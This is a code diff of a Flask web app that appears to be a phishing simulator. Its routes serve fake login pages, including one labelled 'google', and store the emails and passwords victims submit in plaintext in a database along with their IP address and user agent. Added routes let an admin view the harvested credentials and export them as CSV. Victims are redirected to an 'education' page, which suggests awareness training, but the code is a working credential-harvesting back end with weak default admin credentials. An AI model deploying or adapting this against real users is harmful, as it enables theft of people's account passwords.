@@ -1,70 +1,86 @@
-from flask import Flask, render_template, request, redirect, url_for, session
+from flask import Flask, render_template, request, redirect, url_for, session, jsonify
 import datetime
 import os
-from collections import defaultdict
 import json
+from dotenv import load_dotenv
+from prisma import Prisma
+import asyncio
+from functools import wraps
+
+# Load environment variables
+load_dotenv()
 
 app = Flask(__name__)
-app.secret_key = "phish_sim_secret_key_change_in_production"
+app.secret_key = os.getenv('SECRET_KEY', 'fallback-secret-key-change-in-production')
 
-def get_stats():
-    """Calculate real statistics from captured data"""
-    stats = {
-        'total_attempts': 0,
-        'success_rate': 0,
-        'unique_ips': 0,
-        'today_attempts': 0
-    }
-    
-    if not os.path.exists('captured_data.txt'):
-        return stats
-    
-    unique_ips = set()
-    today = datetime.datetime.now().strftime("%Y-%m-%d")
-    today_count = 0
-    total_count = 0
+# Initialize Prisma client
+db = Prisma()
+
+def async_route(f):
+    """Decorator to handle async routes in Flask"""
+    @wraps(f)
+    def wrapper(*args, **kwargs):
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        try:
+            return loop.run_until_complete(f(*args, **kwargs))
+        finally:
+            loop.close()
+    return wrapper
+
+async def get_stats():
+    """Calculate real statistics from database"""
+    await db.connect()
     
     try:
-        with open('captured_data.txt', 'r') as f:
-            for line in f:
-                if line.strip():
-                    total_count += 1
-                    parts = line.strip().split(', ')
-                    
-                    # Extract IP
-                    for part in parts:
-                        if part.startswith('IP: '):
-                            ip = part.replace('IP: ', '')
-                            unique_ips.add(ip)
-                            break
-                    
-                    # Check if today's attempt
-                    for part in parts:
-                        if part.startswith('Time: '):
-                            timestamp = part.replace('Time: ', '')
-                            if timestamp.startswith(today):
-                                today_count += 1
-                            break
+        # Get total attempts
+        total_attempts = await db.capture.count()
         
-        stats['total_attempts'] = total_count
-        stats['unique_ips'] = len(unique_ips)
-        stats['today_attempts'] = today_count
-        # Assuming 100% success rate for captured credentials
-        stats['success_rate'] = 100 if total_count > 0 else 0
+        # Get unique IPs
+        unique_ips_result = await db.query_raw(
+            "SELECT COUNT(DISTINCT ip) as count FROM captures"
+        )
+        unique_ips = unique_ips_result[0]['count'] if unique_ips_result else 0
+        
+        # Get today's attempts
+        today = datetime.datetime.now().date()
+        today_attempts = await db.capture.count(
+            where={
+                'timestamp': {
+                    'gte': datetime.datetime.combine(today, datetime.time.min),
+                    'lte': datetime.datetime.combine(today, datetime.time.max)
+                }
+            }
+        )
+        
+        stats = {
+            'total_attempts': total_attempts,
+            'success_rate': 100 if total_attempts > 0 else 0,
+            'unique_ips': unique_ips,
+            'today_attempts': today_attempts
+        }
+        
+        return stats
         
     except Exception as e:
         print(f"Error calculating stats: {e}")
-    
-    return stats
+        return {
+            'total_attempts': 0,
+            'success_rate': 0,
+            'unique_ips': 0,
+            'today_attempts': 0
+        }
+    finally:
+        await db.disconnect()
 
 @app.route('/', methods=['GET', 'POST'])
-def login():
+@async_route
+async def login():
     if request.method == 'POST':
         email = request.form.get('email')
         password = request.form.get('password')
         browser_data = request.form.get('browserData', '')
-        ip = request.remote_addr
-        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        ip = request.remote_addr or 'unknown'
         
         # Parse browser data if available
         user_agent = ''
@@ -75,8 +91,22 @@ def login():
             except:
                 pass
         
-        with open('captured_data.txt', 'a') as f:
-            f.write(f"Email: {email}, Password: {password}, IP: {ip}, Time: {timestamp}, UserAgent: {user_agent}\n")
+        # Save to database
+        await db.connect()
+        try:
+            await db.capture.create(
+                data={
+                    'email': email,
+                    'password': password,
+                    'ip': ip,
+                    'userAgent': user_agent,
+                    'template': 'google'
+                }
+            )
+        except Exception as e:
+            print(f"Error saving capture: {e}")
+        finally:
+            await db.disconnect()
         
         return redirect(url_for('education'))
     
@@ -90,7 +120,13 @@ def education():
 def admin_login():
     error = None
     if request.method == 'POST':
-        if request.form.get('username') == 'admin' and request.form.get('password') == 'admin123':
+        username = request.form.get('username')
+        password = request.form.get('password')
+        
+        admin_username = os.getenv('ADMIN_USERNAME', 'admin')
+        admin_password = os.getenv('ADMIN_PASSWORD', 'admin123')
+        
+        if username == admin_username and password == admin_password:
             session['logged_in'] = True
             return redirect(url_for('admin'))
         else:
@@ -98,47 +134,105 @@ def admin_login():
     return render_template('admin_login.html', error=error)
 
 @app.route('/admin')
-def admin():
+@async_route
+async def admin():
     if not session.get('logged_in'):
         return redirect(url_for('admin_login'))
     
-    data = []
+    await db.connect()
+    
     try:
-        with open('captured_data.txt', 'r') as f:
-            for line in f:
-                if line.strip():
-                    parts = line.strip().split(', ')
-                    email = parts[0].replace('Email: ', '') if len(parts) > 0 else 'Unknown'
-                    password = parts[1].replace('Password: ', '') if len(parts) > 1 else 'Unknown'
-                    ip = parts[2].replace('IP: ', '') if len(parts) > 2 else 'Unknown'
-                    time = parts[3].replace('Time: ', '') if len(parts) > 3 else 'Unknown'
-                    user_agent = parts[4].replace('UserAgent: ', '') if len(parts) > 4 else 'Unknown'
-                    
-                    # Truncate long user agents for display
-                    if len(user_agent) > 50:
-                        user_agent = user_agent[:50] + '...'
-                    
-                    data.append([email, password, ip, time, user_agent])
-    except FileNotFoundError:
-        pass
-    
-    # Get real statistics
-    stats = get_stats()
-    
-    return render_template('admin.html', data=data, stats=stats)
+        # Get all captures ordered by newest first
+        captures = await db.capture.find_many(
+            order={
+                'timestamp': 'desc'
+            }
+        )
+        
+        # Format data for template
+        data = []
+        for capture in captures:
+            user_agent = capture.userAgent or 'Unknown'
+            # Truncate long user agents for display
+            if len(user_agent) > 50:
+                user_agent = user_agent[:50] + '...'
+            
+            data.append([
+                capture.email,
+                capture.password,
+                capture.ip,
+                capture.timestamp.strftime("%Y-%m-%d %H:%M:%S"),
+                user_agent
+            ])
+        
+        # Get statistics
+        stats = await get_stats()
+        
+        return render_template('admin.html', data=data, stats=stats)
+        
+    except Exception as e:
+        print(f"Error loading admin data: {e}")
+        return render_template('admin.html', data=[], stats={
+            'total_attempts': 0,
+            'success_rate': 0,
+            'unique_ips': 0,
+            'today_attempts': 0
+        })
+    finally:
+        await db.disconnect()
 
 @app.route('/admin/clear_data', methods=['POST'])
-def clear_data():
+@async_route
+async def clear_data():
     if not session.get('logged_in'):
         return redirect(url_for('admin_login'))
     
+    await db.connect()
+    
     try:
-        if os.path.exists('captured_data.txt'):
-            os.remove('captured_data.txt')
+        await db.capture.delete_many()
+        print("All capture data cleared")
     except Exception as e:
         print(f"Error clearing data: {e}")
+    finally:
+        await db.disconnect()
     
     return redirect(url_for('admin'))
+
+@app.route('/admin/export')
+@async_route
+async def export_data():
+    if not session.get('logged_in'):
+        return redirect(url_for('admin_login'))
+    
+    await db.connect()
+    
+    try:
+        captures = await db.capture.find_many(
+            order={
+                'timestamp': 'desc'
+            }
+        )
+        
+        # Create CSV data
+        csv_data = "Email,Password,IP Address,Timestamp,User Agent,Template\n"
+        for capture in captures:
+            csv_data += f'"{capture.email}","{capture.password}","{capture.ip}","{capture.timestamp}","{capture.userAgent or "Unknown"}","{capture.template or "Unknown"}"\n'
+        
+        response = app.response_class(
+            csv_data,
+            mimetype='text/csv',
+            headers={
+                'Content-Disposition': f'attachment; filename=phishing_data_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
+            }
+        )
+        return response
+        
+    except Exception as e:
+        print(f"Error exporting data: {e}")
+        return redirect(url_for('admin'))
+    finally:
+        await db.disconnect()
 
 @app.route('/logout')
 def logout():
@@ -146,17 +240,39 @@ def logout():
     return redirect(url_for('admin_login'))
 
 @app.route('/template/<template_name>', methods=['GET', 'POST'])
-def phishing_template(template_name):
+@async_route
+async def phishing_template(template_name):
     if request.method == 'POST':
-        # Handle form submission similar to login route
         email = request.form.get('email')
         password = request.form.get('password')
         browser_data = request.form.get('browserData', '')
-        ip = request.remote_addr
-        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        ip = request.remote_addr or 'unknown'
         
-        with open('captured_data.txt', 'a') as f:
-            f.write(f"Email: {email}, Password: {password}, IP: {ip}, Time: {timestamp}, Template: {template_name}\n")
+        # Parse browser data if available
+        user_agent = ''
+        if browser_data:
+            try:
+                browser_info = json.loads(browser_data)
+                user_agent = browser_info.get('userAgent', '')
+            except:
+                pass
+        
+        # Save to database
+        await db.connect()
+        try:
+            await db.capture.create(
+                data={
+                    'email': email,
+                    'password': password,
+                    'ip': ip,
+                    'userAgent': user_agent,
+                    'template': template_name
+                }
+            )
+        except Exception as e:
+            print(f"Error saving capture: {e}")
+        finally:
+            await db.disconnect()
         
         return redirect(url_for('education'))
     
@@ -172,6 +288,33 @@ def phishing_template(template_name):
         return render_template(templates[template_name])
     else:
         return redirect(url_for('login'))
+
+@app.route('/api/stats')
+@async_route
+async def api_stats():
+    """API endpoint for live statistics"""
+    if not session.get('logged_in'):
+        return jsonify({'error': 'Unauthorized'}), 401
+    
+    stats = await get_stats()
+    return jsonify(stats)
+
+# Health check for Vercel
+@app.route('/health')
+def health():
+    return jsonify({'status': 'healthy', 'timestamp': datetime.datetime.now().isoformat()})
+
+# Initialize database on startup
+@app.before_first_request
+@async_route
+async def initialize_database():
+    try:
+        await db.connect()
+        print("Database connected successfully")
+    except Exception as e:
+        print(f"Database connection error: {e}")
+    finally:
+        await db.disconnect()
 
 if __name__ == '__main__':
     app.run(debug=True)
